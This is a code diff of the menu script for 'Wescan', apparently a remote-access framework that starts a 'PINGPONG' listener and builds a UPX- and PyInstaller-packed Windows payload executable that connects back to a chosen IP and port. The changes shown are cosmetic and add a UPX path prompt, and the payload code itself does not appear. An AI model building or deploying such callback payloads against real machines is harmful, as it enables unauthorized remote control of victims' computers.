@@ -4,9 +4,19 @@
 # @Author    :D0WE1L1N\
 import handler
 import payload.payload_packer
+#print的基本函数
+def print_error(str):
+    print('\033[0;31m'+ str + '\033[0m')
+def print_good(str):
+    print('\033[0;36m'+ str + '\033[0m')
+def print_warn(str):
+    print('\033[0;33m'+ str + '\033[0m')
+def print_normal(str):
+    print('\033[0;34m'+ str + '\033[0m')
+#主程序
 def print_main():
-    print(
-        '''
+    print_good(
+        '''\033[0;35m
 (    (        )             (        )      )            ____ 
 )\ ) )\ )  ( /(  (          )\ )  ( /(   ( /(  (        |   / 
 (()/((()/(  )\()) )\ )      (()/(  )\())  )\()) )\ )     |  /  
@@ -20,18 +30,20 @@ def print_main():
 ========================WELCOME !!========================
 ====================Wescan   V0.0.3.1 ====================
 ====================Aurthor : D0WE1L1N====================                                                                                                                
-    ''')
+    \033[0m''')
     main()
+#选择
 def sub_main():
     choice = input("choose your choice>")
     if choice == "1":
        startserver()
     if choice == "2":
-        print("type of payload:")
-        print("1) PINGPONG windows x64")
-        print("YOU NEED TO INSTALL UPX AND PYINSTALLER, if you already install BOTH of it, ignore this")
+        print_normal("type of payload:")
+        print_normal("1) PINGPONG windows x64")
+        print_warn("YOU NEED TO INSTALL UPX AND PYINSTALLER, if you already install BOTH of it, ignore this")
         type = input("choose your choice>")
         if type == "1":
+            upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
             ip = input("payload>[*]Please input the ip of your host(blank for 127.0.0.1)>")
             port = input("payload>[*]Please input the port(blank for 624)>")
             if port == "":
@@ -42,9 +54,9 @@ def sub_main():
                 try:
                     port = int(port)
                 except:
-                    print("handler>[-]port input error")
+                    print_error("handler>[-]port input error")
             # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
-            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", ip, port, True)
+            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", ip, port, True, upx_dir)
             print("THE PAYLOAD IS IN ./payload/upload_payload/payload.exe")
     if choice == "PING":
         print("PONG")
@@ -55,9 +67,9 @@ def sub_main():
         print("error:no such choice")
         main()
 def main():
-    print("Active choice:")
-    print("1) Start a PINGPONG handler")
-    print("2) Make payload(s)")
+    print_normal("Active choice:")
+    print_normal("1) Start a PINGPONG handler")
+    print_normal("2) Make payload(s)")
     # print("3) Settings")
     sub_main()
 def startserver():
